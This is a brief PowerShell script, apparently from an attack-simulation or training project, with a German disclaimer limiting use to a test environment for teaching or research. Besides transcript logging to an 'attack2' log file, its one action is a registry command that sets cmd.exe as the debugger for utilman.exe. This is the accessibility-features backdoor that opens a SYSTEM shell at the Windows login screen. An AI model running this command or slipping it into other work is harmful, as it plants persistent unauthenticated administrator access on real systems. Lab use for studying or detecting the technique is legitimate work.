<# 
--------------------------------------------------------------------------------------------
Die Verwendung der folgenden Skripte ist nur innerhalb der dafür vorgesehenen Testumgebung zu Lehr- oder Forschungszwecken erlaubt.
Jeglicher Missbrauch zur Verursachung von Schaden oder missbräuchliche Verwendung mit bösartigen Absichten ist strengstens untersagt.
Die Verantwortung liegt allein beim Anwender / der Anwenderin.
Das Projektteam übernimmt keine Verantwortung für Schäden, die durch Dritte entstehen.
--------------------------------------------------------------------------------------------
#>

$path = "C:\prehendo\Logs\attack2.txt"

$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $path -append


####################AccessibilityFeatures START####################

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

####################AccessibilityFeatures END####################

Stop-Transcript




